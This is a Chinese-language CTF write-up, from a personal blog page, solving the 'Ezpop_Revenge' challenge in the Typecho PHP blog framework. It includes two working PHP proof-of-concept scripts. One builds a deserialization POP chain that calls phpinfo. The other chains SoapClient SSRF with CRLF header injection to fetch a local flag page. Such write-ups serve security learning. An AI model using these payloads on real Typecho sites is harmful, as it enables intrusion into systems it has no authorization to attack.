@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Ezpop_Revenge-wp"/>
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/"/>
+
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ezpop_Revenge-wp">
+<meta property="og:url" content="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/GWdjpq8tK4fSxkh.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/jt7fRAmNbnqs8i4.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/lfYUHtvN5iZnF2q.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/Xp7JvQODeqbMVds.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/bq6jJCWcTZag5iK.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/sR9JGPkYji57uNX.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/Hu1dpmU4DQI6ntG.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/wZFXTgf6OBM3r4H.png">
+<meta property="article:published_time" content="2020-03-29T04:39:49.000Z">
+<meta property="article:modified_time" content="2020-03-29T12:50:15.629Z">
+<meta property="article:author" content="glotozz">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/03/29/GWdjpq8tK4fSxkh.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="http://music.163.com/song/media/outer/url?id=1321392802.mp3"></iframe>--!>
+<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
+    <title> Ezpop_Revenge-wp - glotozz'blog </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/stars">
+                            
+                            
+                                Stars
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Ezpop_Revenge-wp
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 29 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
+<!-- toc -->
+
+<ul>
+<li><a href="#简单分析">简单分析</a></li>
+<li><a href="#思路一">思路一</a></li>
+<li><a href="#思路二">思路二</a></li>
+</ul>
+<!-- tocstop -->
+
+<hr>
+<p>下午看队里师傅们在讨论这题，于是也来划划水。</p>
+<p><code>www.zip</code>源码泄露，Typecho框架，只记得有个远古时期反序列化漏洞</p>
+<p>这类blog类型的框架的漏洞很多出现在插件或主题中，这里看了下目录结构，找到了入口</p>
+<p><img src="https://i.loli.net/2020/03/29/GWdjpq8tK4fSxkh.png" alt="Snipaste_2020-03-29_15-14-57.png"></p>
+<h4><span id="简单分析">简单分析</span></h4><p><code>var/Typecho/Plugin.php</code></p>
+<p>激活插件方法处得到绑定的url</p>
+<p><img src="https://i.loli.net/2020/03/29/jt7fRAmNbnqs8i4.png" alt="Snipaste_2020-03-29_16-09-42.png"></p>
+<p><code>usr/plugins/HelloWorld/Plugin.php</code></p>
+<p>反序列化触发点</p>
+<p><img src="https://i.loli.net/2020/03/29/lfYUHtvN5iZnF2q.png" alt="Snipaste_2020-03-29_15-50-26.png"></p>
+<p>反序列化入口类</p>
+<p><img src="https://i.loli.net/2020/03/29/Xp7JvQODeqbMVds.png" alt="Snipaste_2020-03-29_15-21-02.png"></p>
+<p>跟进</p>
+<p><img src="https://i.loli.net/2020/03/29/bq6jJCWcTZag5iK.png" alt="Snipaste_2020-03-29_15-24-22.png"></p>
+<p>第一处字符串拼接触发<code>__toString()</code></p>
+<p>第二处可以调用任意类的任意方法，以及触发<code>__call()</code></p>
+<hr>
+<p>既然能触发<code>__toString()</code>，那么第一个思路就开始了，其实就是远古的那条POP链，原理不在赘述。</p>
+<p>第二个思路应该是预期解，就是利用SSRF带个sessionid，再次访问会<code>var_dump()</code></p>
+<h4><span id="思路一">思路一</span></h4><p>我当时分析的POP链</p>
+<p><code>var/Typecho/Feed.php</code>-&gt;<code>__toString()</code>-&gt;<code>$item[&#39;author&#39;]-&gt;screenName
+var/Typecho/Request.php</code>-&gt;<code>__get()</code>-&gt;<code>get()</code>-&gt;<code>_applyFilter</code>-&gt;<code>call_user_func()</code></p>
+<p><strong>POC编写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">	private $_params &#x3D; [];</span><br><span class="line">	private $filter &#x3D; [];</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;_params &#x3D; [&#39;screenName&#39;&#x3D;&gt;&#39;1&#39;];</span><br><span class="line">		$this-&gt;filter &#x3D; [&#39;phpinfo&#39;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line">	private $_items &#x3D; [];</span><br><span class="line">	private $_type;</span><br><span class="line">	const RSS2 &#x3D; &#39;RSS 2.0&#39;;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		$this-&gt;_items &#x3D; [&#39;author&#39;&#x3D;&gt;new Typecho_Request,&#39;category&#39;&#x3D;&gt;[new Typecho_Request]];&#x2F;&#x2F;注意点</span><br><span class="line">		$this-&gt;_type &#x3D; self::RSS2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$this-&gt;coincidence &#x3D; [&#39;hello&#39;&#x3D;&gt;new Typecho_Feed,&#39;world&#39;&#x3D;&gt;&#39;gqy&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new HelloWorld_DB));</span><br></pre></td></tr></table></figure>
+
+<p>这里的category是为了让程序报错，从而程序强制停止，那么缓冲区的数据会输出出来。当时有个<code>ob_start()</code>但是这里没有<code>ob_start()</code>，尝试其他的办法也无果，应该是新版本修复了漏洞，如何修复的没有继续深究。</p>
+<p><img src="https://i.loli.net/2020/03/29/sR9JGPkYji57uNX.png" alt="Snipaste_2020-03-29_17-38-48.png"></p>
+<p><code>Fatal error: Method Typecho_Feed::__toString() must not  throw an exception, caught Error: Cannot use object of type  Typecho_Request as array</code></p>
+<p>PS:那个过滤是不是0day😁</p>
+<h4><span id="思路二">思路二</span></h4><p><code>var/Typecho/Db/Query.php</code></p>
+<p><img src="https://i.loli.net/2020/03/29/Hu1dpmU4DQI6ntG.png" alt="Snipaste_2020-03-29_18-17-10.png"></p>
+<p>这里明显可以触发<code>__call()</code>，配合<code>SoapClient</code>进行SSRF</p>
+<p><strong>POC编写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query&#123;</span><br><span class="line">	private $_adapter;</span><br><span class="line">	private $_sqlPreBuild;</span><br><span class="line">	function __construct()&#123;</span><br><span class="line">		&#x2F;&#x2F; $target &#x3D; &#39;http:&#x2F;&#x2F;118.178.88.46:1234&#39;;</span><br><span class="line">		$target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;;</span><br><span class="line">		$post_string &#x3D; &#39;gqy&#x3D;1&#39;. &quot;\r\n&quot;;</span><br><span class="line">		$headers &#x3D; array(</span><br><span class="line">		    &#39;Cookie: PHPSESSID&#x3D;glotozz&#39;,</span><br><span class="line">		    &#x2F;&#x2F; &#39;X-Forwarded-For: 127.0.0.1&#39;</span><br><span class="line">		    );</span><br><span class="line">		$b &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;wupco^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39; &#x3D;&gt; &quot;aaab&quot;));</span><br><span class="line">		$aaa &#x3D; serialize($b);</span><br><span class="line">		$aaa &#x3D; str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">		$aaa &#x3D; str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);</span><br><span class="line">		$c &#x3D; unserialize($aaa);</span><br><span class="line">		&#x2F;&#x2F; $c-&gt;notexist();</span><br><span class="line">		&#x2F;&#x2F; var_dump($c);</span><br><span class="line">		$this-&gt;_adapter &#x3D; $c;</span><br><span class="line">		$this-&gt;_sqlPreBuild &#x3D; [&#39;action&#39;&#x3D;&gt;&#39;SELECT&#39;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence &#x3D; [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">    	$this-&gt;coincidence &#x3D; [&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query,&#39;world&#39;&#x3D;&gt;&#39;gqy&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new HelloWorld_DB));</span><br></pre></td></tr></table></figure>
+
+<p>修改Cookie，PHPSESSID设置成<code>glotozz</code>再次访问</p>
+<p><img src="https://i.loli.net/2020/03/29/wZFXTgf6OBM3r4H.png" alt="Snipaste_2020-03-29_19-36-36.png"></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/03/28/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">
+        <span class="next-text nav-default">出题笔记</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon">
+<span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+  </body>
+</html>
